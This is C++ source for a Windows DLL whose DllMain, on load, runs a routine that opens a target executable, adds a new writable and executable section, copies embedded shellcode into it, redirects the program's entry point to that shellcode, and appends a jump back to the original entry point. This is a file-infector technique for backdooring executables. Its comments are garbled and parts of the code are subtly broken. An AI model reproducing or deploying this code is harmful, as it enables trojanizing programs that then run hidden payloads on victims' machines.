#include<Windows.h>
wchar_t path[MAX_PATH] = L"test.exe";


struct INJINFO
{
	char path[MAX_PATH];
	int size;
};
unsigned char jmpOldOep[] = {
	0xE9, 0x00, 0x00, 0x00, 0x00
};

DWORD Aligment(DWORD dwSize, DWORD dwAlig)
{
	return (dwSize%dwAlig == 0) ? dwSize : (dwSize / dwAlig + 1)*dwAlig;
}


__declspec(dllexport) void __cdecl Inject()
{
	INJINFO injinfo;
	ZeroMemory(&injinfo, sizeof(INJINFO));
	char *baseaddr=NULL;
	_asm
	{
		call get_baseaddr
		get_baseaddr :
		pop baseaddr
	}
	char *dataaddr = baseaddr + 7000;
	char *shellcode = new char(injinfo.size);
	memcpy(shellcode, dataaddr+sizeof(INJINFO), injinfo.size);
	memcpy(&injinfo, dataaddr, sizeof(INJINFO));
	HANDLE hFile = CreateFileA(injinfo.path, FILE_GENERIC_READ | FILE_GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return;
	}
	HANDLE hFileMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
	if (NULL == hFileMap)
	{
		CloseHandle(hFile);
		CloseHandle(hFileMap);
		return;
	}
	LPVOID lpMemory = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (NULL == lpMemory)
	{
		CloseHandle(hFileMap);
		CloseHandle(hFile);
		return;
	}
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpMemory;    //��ȡDOSͷ
	PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)lpMemory + pDosHeader->e_lfanew); //��ȡNTͷ
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE || pNTHeader->Signature != IMAGE_NT_SIGNATURE)  //�ж�PE
	{
		return;
	}
	PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)&pNTHeader->FileHeader;  //ͨ��NTͷ��ȡ�ļ�ͷ
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&pNTHeader->OptionalHeader; //ͨ��NTͷ��ȡ��ѡ�ļ�ͷ
	PIMAGE_SECTION_HEADER pFirstSectiongHeader = IMAGE_FIRST_SECTION(pNTHeader);  //ͨ��NTͷ��ȡ��һ���ڱ�ͷ
	int sectionNum = pFileHeader->NumberOfSections++;                             //�ڱ�����һ
	PIMAGE_SECTION_HEADER pLastSectionHeader = pFirstSectiongHeader + sectionNum; //ͨ����һ���ڱ�ͷ��ȡ�¼ӵ�һ���ڱ�ͷ
	DWORD dwFileAlig = pOptionalHeader->FileAlignment;
	DWORD dwMemAlig = pOptionalHeader->SectionAlignment;
	memcpy(pLastSectionHeader->Name, ".code", 7);
	pLastSectionHeader->Misc.VirtualSize = injinfo.size;
	pLastSectionHeader->SizeOfRawData = Aligment(injinfo.size, dwFileAlig);
	pLastSectionHeader->VirtualAddress = (pLastSectionHeader - 1)->VirtualAddress + Aligment((pLastSectionHeader - 1)->SizeOfRawData, dwMemAlig);  //����ƫ��
	pLastSectionHeader->PointerToRawData = Aligment((pLastSectionHeader - 1)->PointerToRawData + (pLastSectionHeader - 1)->Misc.VirtualSize, dwFileAlig); //�ļ�ƫ��
	pLastSectionHeader->Characteristics = 0xE0000060;
	pOptionalHeader->SizeOfImage = Aligment(pLastSectionHeader->VirtualAddress + pLastSectionHeader->SizeOfRawData, dwMemAlig);
	//�޸���ڵ�
	DWORD oldOep = pOptionalHeader->AddressOfEntryPoint;
	DWORD jmpOffest = oldOep - (pLastSectionHeader->VirtualAddress + injinfo.size) - sizeof(jmpOldOep);
	pOptionalHeader->AddressOfEntryPoint = pLastSectionHeader->VirtualAddress;
	*(DWORD*)&jmpOldOep[1] = jmpOffest;
	//�޸��ļ�
	int newFileSize = pLastSectionHeader->PointerToRawData + pLastSectionHeader->SizeOfRawData;
	char* pNewFile = new char[newFileSize];
	ZeroMemory(pNewFile, newFileSize);
	memcpy(pNewFile, lpMemory, pLastSectionHeader->PointerToRawData);
	memcpy(pNewFile + pLastSectionHeader->PointerToRawData, shellcode, injinfo.size);
	//���תָ��
	memcpy(pNewFile + pLastSectionHeader->PointerToRawData + injinfo.size, jmpOldOep, sizeof(jmpOldOep));
	//д���ļ�
	DWORD dwWrite = 0;
	WriteFile(hFile, pNewFile, newFileSize, &dwWrite, NULL);
	delete[] pNewFile;
	delete[] shellcode;
	CloseHandle(hFileMap);
	CloseHandle(hFile);
}

BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		Inject();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}